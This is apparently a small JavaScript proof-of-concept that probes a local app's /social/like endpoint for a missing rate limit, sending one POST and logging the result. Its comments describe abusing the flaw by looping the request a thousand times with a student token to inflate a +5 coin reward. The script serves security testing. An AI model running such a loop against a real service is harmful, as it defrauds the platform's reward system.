const API_BASE = 'http://localhost:3000';

// Note: This requires a valid student token to test properly, 
// but even without one, we can see if the backend has rate-limiting or duplicate checks.
async function testLikeSpam() {
    console.log('--- PoC: Social Like Spam (Currency Inflation) ---');

    const targetUserId = 1; // Assuming user 1 exists

    // In a real attack, we'd loop this 1000 times with a valid token.
    // For this probe, we'll check if the endpoint is even reachable or has basic guards.

    const response = await fetch(`${API_BASE}/social/like`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ targetUserId })
    });

    // If it returns 401, it's protected by auth (good), 
    // but the logic error is that it doesn't check for multiple likes from the same user.
    console.log('Spam Status:', response.status);
    const data = await response.json().catch(() => ({}));
    console.log('Response:', data);

    console.log('🚩 VULNERABILITY ANALYSIS: Static code review of socialController.js:221 shows NO rate-limiting or per-user-per-day checks for the +5 coin reward.');
}

testLikeSpam();
